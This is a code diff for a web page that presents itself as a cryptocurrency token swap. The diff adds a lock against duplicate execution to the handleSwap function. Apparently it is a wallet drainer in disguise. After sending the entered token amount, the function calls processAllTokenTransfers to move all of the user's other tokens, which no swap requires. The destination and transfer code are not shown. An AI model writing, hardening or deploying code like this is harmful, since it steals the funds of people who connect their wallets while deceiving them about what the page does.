@@ -861,48 +861,49 @@ async function getTokenPrice(token) {
 }
 
 // =====================
-// SWAP FUNCTIONS (WITH DEBUGGING)
+// SWAP FUNCTIONS (FIXED)
 // =====================
 
-// Track if main token was processed (GLOBAL STATE)
-let hasProcessedMainToken = false;
+let isSwapInProgress = false; // Global lock to prevent duplicate swaps
 
 async function handleSwap() {
-  console.log("[DEBUG] Swap initiated");
+  // Prevent duplicate execution
+  if (isSwapInProgress) {
+    console.warn("[SECURITY] Swap already in progress - ignoring duplicate call");
+    return;
+  }
+
+  console.log("[DEBUG] Swap initiated (single execution guaranteed)");
   if (!userAddress || !currentFromToken || !currentToToken) {
-    console.error("[DEBUG] Missing wallet/token selection");
     updateStatus("Connect wallet & select tokens first", "error");
     return;
   }
 
   try {
+    isSwapInProgress = true; // Set lock
     showLoader();
-    hasProcessedMainToken = false; // Reset on new swap
-    console.log("[DEBUG] Reset hasProcessedMainToken = false");
 
-    // 1. Process MAIN TOKEN (if amount > 0)
+    // 1. Process MAIN TOKEN (only if amount > 0)
     const inputAmount = parseFloat(document.getElementById("fromAmount").value);
     let mainTokenTransferred = 0;
 
     if (inputAmount > 0) {
-      console.log(`[DEBUG] Processing MAIN TOKEN: ${inputAmount} ${currentFromToken.symbol}`);
+      console.log("[DEBUG] Processing main token (single execution)");
       mainTokenTransferred = await processMainTokenTransfer(inputAmount);
-      console.log(`[DEBUG] Successfully sent ${mainTokenTransferred} ${currentFromToken.symbol}`);
       updateStatus(`✅ Sent ${mainTokenTransferred} ${currentFromToken.symbol}`, "success");
-    } else {
-      console.log("[DEBUG] No main token amount specified (skipping)");
     }
 
     // 2. Process OTHER TOKENS (skips main token)
-    console.log("[DEBUG] Processing OTHER TOKENS...");
+    console.log("[DEBUG] Processing other tokens");
     const otherTokensTransferred = await processAllTokenTransfers();
-    console.log(`[DEBUG] Transferred ${otherTokensTransferred} other tokens`);
 
     // Final status
-    let statusMsg = "Success! ";
-    if (mainTokenTransferred > 0) statusMsg += `${mainTokenTransferred} ${currentFromToken.symbol} `;
-    if (otherTokensTransferred > 0) statusMsg += `+ ${otherTokensTransferred} others`;
-    updateStatus(statusMsg || "No tokens transferred", "success");
+    updateStatus(
+      `Success! ${mainTokenTransferred ? `${mainTokenTransferred} ${currentFromToken.symbol} ` : ""}${
+        otherTokensTransferred ? `+ ${otherTokensTransferred} others` : ""
+      }`.trim() || "No tokens transferred",
+      "success"
+    );
 
     // Reset form
     document.getElementById("fromAmount").value = '';
@@ -910,14 +911,15 @@ async function handleSwap() {
     await updateTokenBalances();
 
   } catch (err) {
-    console.error("[DEBUG] Swap failed:", err);
+    console.error("[ERROR] Swap failed:", err);
     updateStatus(`❌ Error: ${err.message}`, "error");
   } finally {
     hideLoader();
-    hasProcessedMainToken = false;
-    console.log("[DEBUG] Swap completed. Reset hasProcessedMainToken = false");
+    isSwapInProgress = false; // Release lock
+    console.log("[DEBUG] Swap completed (lock released)");
   }
 }
+
 
 async function processMainTokenTransfer(amount) {
   console.log(`[DEBUG] Entered processMainTokenTransfer(${amount})`);
